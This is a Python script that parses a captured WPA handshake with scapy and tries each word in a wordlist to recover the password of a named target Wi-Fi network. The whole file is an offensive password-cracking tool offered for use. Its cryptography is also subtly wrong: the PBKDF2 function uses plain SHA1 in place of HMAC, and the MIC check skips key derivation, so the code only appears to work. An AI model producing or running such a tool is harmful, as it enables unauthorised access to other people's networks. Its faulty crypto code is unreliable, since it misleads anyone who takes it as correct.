import hashlib
from scapy.all import rdpcap, EAPOL
from Crypto.Protocol.KDF import PBKDF2

# Function to extract the handshake from the .cap file
def extract_handshake(pcap_file):
    packets = rdpcap(pcap_file)
    eapol_packets = []

    for packet in packets:
        if packet.haslayer(EAPOL):
            eapol_packets.append(packet)
    
    # Ensure that we have a 4-way handshake (at least 4 EAPOL packets)
    if len(eapol_packets) >= 4:
        return eapol_packets
    else:
        raise ValueError("Handshake not found or incomplete in the provided capture file.")

# Function to derive the PSK from password using PBKDF2
def derive_psk(password, ssid):
    ssid_bytes = ssid.encode('utf-8')
    password_bytes = password.encode('utf-8')
    
    # PBKDF2-HMAC-SHA1 to derive the 256-bit PSK (32-byte key)
    psk = PBKDF2(password_bytes, ssid_bytes, dkLen=32, count=4096, prf=lambda p, s: hashlib.sha1(p + s).digest())
    return psk

# Function to verify the password by checking the MIC (Message Integrity Code)
def verify_password(handshake, password, ssid):
    # Extract the MIC (Message Integrity Code) from the handshake
    # You will need to extract this from the 4th EAPOL message in the handshake
    mic = handshake[3].load[-16:]

    # Derive the PSK using the password and SSID
    psk = derive_psk(password, ssid)

    # Compute the MIC from the derived PSK
    # (This is where you perform the actual MIC comparison; requires handling EAPOL fields)
    generated_mic = hashlib.sha1(psk + handshake[3].load[:-16]).digest()[-16:]

    # Compare the generated MIC with the extracted MIC
    return generated_mic == mic

# Function to crack the WPA password using the wordlist
def crack_wpa(pcap_file, ssid, wordlist):
    # Extract the handshake from the .cap file
    handshake = extract_handshake(pcap_file)

    # Try each password from the wordlist
    with open(wordlist, 'r') as file:
        for line in file:
            password = line.strip()
            print(f"Trying: {password}")
            if verify_password(handshake, password, ssid):
                print(f"Password found: {password}")
                return password

    print("Password not found in the wordlist.")
    return None

# Example usage:
pcap_file = "shak.cap"  # Path to the .cap file containing the WPA handshake
ssid = "PEKLO"          # SSID of the target network
wordlist = "pwd.txt"    # Path to the wordlist file containing potential passwords

# Start the cracking process
crack_wpa(pcap_file, ssid, wordlist)
